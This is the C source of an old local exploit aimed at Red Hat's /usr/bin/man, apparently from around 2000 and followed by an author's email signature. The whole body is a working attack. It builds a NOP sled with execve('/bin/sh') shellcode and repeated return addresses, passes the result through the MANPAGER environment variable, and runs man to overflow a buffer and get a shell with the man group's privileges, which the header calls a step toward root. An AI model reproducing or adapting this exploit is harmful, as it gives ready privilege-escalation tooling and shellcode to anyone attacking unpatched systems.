/*
 * (c) 2000 babcia padlina / b0f
 * (lcamtuf's idea)
 *
 * redhat /usr/bin/man exploit (gid=15 leads to potential root compromise)
*/

#include <stdio.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <string.h>

#define NOP		0x90
#define OFS		1800
#define BUFSIZE		4002
#define ADDRS		1000

long getesp(void)
{
   __asm__("movl %esp, %eax\n");
}

int main(argc, argv)
int argc;
char **argv;
{
	char *execshell =
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh";

	char *buf, *p;
	int noplen, i, ofs;
	long ret, *ap;

	if(!(buf = (char *)malloc(BUFSIZE+ADDRS+1)))
	{
		perror("malloc()");
		return -1;
	}

	if (argc > 1)
		ofs = atoi(argv[1]);
	else
		ofs = OFS;

	noplen = BUFSIZE - strlen(execshell);
	ret = getesp() + ofs;

	memset(buf, NOP, noplen);
	buf[noplen+1] = '\0';
	strcat(buf, execshell);

	p = buf + noplen + strlen(execshell);
        ap = (unsigned long *)p;

        for(i = 0; i < ADDRS / 4; i++)
                *ap++ = ret;

        p = (char *)ap;
        *p = '\0';

	fprintf(stderr, "RET: 0x%x  len: %d\n\n", ret, strlen(buf));

	setenv("MANPAGER", buf, 1);
	execl("/usr/bin/man", "man", "ls", 0);

	return 0;
}
-- 
* Fido: 2:480/124 ** WWW: http://www.freebsd.lublin.pl ** NIC-HDL: PMF9-RIPE *
* Inet: venglin@freebsd.lublin.pl ** PGP: D48684904685DF43  EA93AFA13BE170BF *

